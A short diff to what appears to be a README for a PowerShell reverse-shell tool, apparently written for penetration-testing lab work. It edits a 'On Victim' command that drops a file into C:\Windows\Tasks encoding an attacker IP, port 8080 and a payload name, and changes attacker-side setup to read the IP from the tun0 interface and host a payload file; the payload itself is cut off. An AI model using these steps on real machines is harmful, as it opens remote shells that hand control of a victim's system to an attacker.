@@ -3,11 +3,12 @@
 Example for a Posh-Reverse-Shell
 ```
 # On Victim
-echo "192_168_45_209_80_finance" > C:\Windows\Tasks\finances.txt
+Set-Content -Value "192_168_45_209_8080_finance" -Path "C:\Windows\Tasks\finances.txt" -NoNewline
 ```
 Create a file `finance` that will be being hosted on your webserver.
 ```
-ip="192.168.45.172"; 
+#ip="192.168.45.172";
+ip=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
 filename="payday.txt";
 
 # Create payday.txt
